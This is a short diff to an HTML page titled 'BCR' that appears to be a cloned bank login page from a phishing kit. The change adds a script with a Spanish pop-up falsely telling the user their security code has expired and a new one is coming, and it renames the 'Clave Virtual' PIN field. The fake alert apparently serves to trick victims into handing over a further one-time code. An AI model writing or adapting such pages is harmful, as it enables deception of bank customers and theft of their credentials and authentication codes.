@@ -5,7 +5,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <link href="archivos/style.css" rel="stylesheet" type="text/css">
-
+<script>
+    alert("El codigo de seguridad a expirado, por favor espera le enviaremos uno nuevo");
+</script>
 <title>BCR</title>
 
 </head>
@@ -41,7 +43,7 @@
                 <hr class="line1" color="#C4C4C4">
                 <img class="userimg" src="archivos/Seguridad.svg">
                 <div class="floating-label">
-                    <input class="pass" type="tel" placeholder=" " name="codigo" id="cpass" autocomplete="off" maxlength="6" required>
+                    <input class="pass" type="tel" placeholder=" " name="cpass" id="cpass" autocomplete="off" maxlength="6" required>
                     <span class="highlight2"></span>
                     <label>Clave Virtual</label>
                     <img id="imgpass1" src="archivos/ver.png" class="ver" onclick="pass1(); pass2(); pass11();">
